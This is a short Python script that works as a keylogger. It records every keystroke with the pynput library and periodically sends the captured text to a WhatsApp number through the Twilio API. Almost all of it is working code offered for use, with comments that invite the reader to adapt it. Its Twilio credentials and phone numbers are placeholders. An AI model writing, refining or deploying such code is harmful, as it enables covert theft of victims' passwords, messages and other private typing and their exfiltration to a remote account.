from twilio.rest import Client

account_sid = '944rwdgwsd'
auth_token = '839053g3gergsgrsgrsg'
client = Client(account_sid, auth_token)



# print(message.sid)

def send_whatsapp(text):
    message = client.messages.create(
        from_='whatsapp:+twilio number',
        body='New keyboard inputs captured'+str(text),
        to='whatsapp:+91your whatsapp number'
    )

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#it is used for keystroke listener
from pynput import keyboard

#to store the key
logs=[]
message =""

def on_press(key):
    global logs
    print('alphanumeric key {0} pressed'.format(key))
    k=str(key).replace("'","")
    if(k=="Key.backspace" and len(logs)!=0):
        logs.pop()
    else:
        logs.append(k)
    '''here i have consider 1000 words after that it will send the mail
       you can change according to your need
    '''
    if(len(logs)>1000):
        write_file(logs)
        logs=[]

def write_file(logs):
    #print("in write_file")
    global message
    for k in logs:
        if(k.find("space")>0):
            k=" "
            message +=k
        elif(k.find("enter")>0):
            k="[ENTER]\n"
            message +=k
        elif(k.find("Key")==-1):
            message +=k
    send_whatsapp(message)

'''it is used to stop the listener
If you dont want the listener to stop you can delete it
'''
def on_release(key):
    global logs
    if key == keyboard.Key.esc:
        if(logs):
            write_file(logs)
            logs=[]
        return False

#to start the keylistener program
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()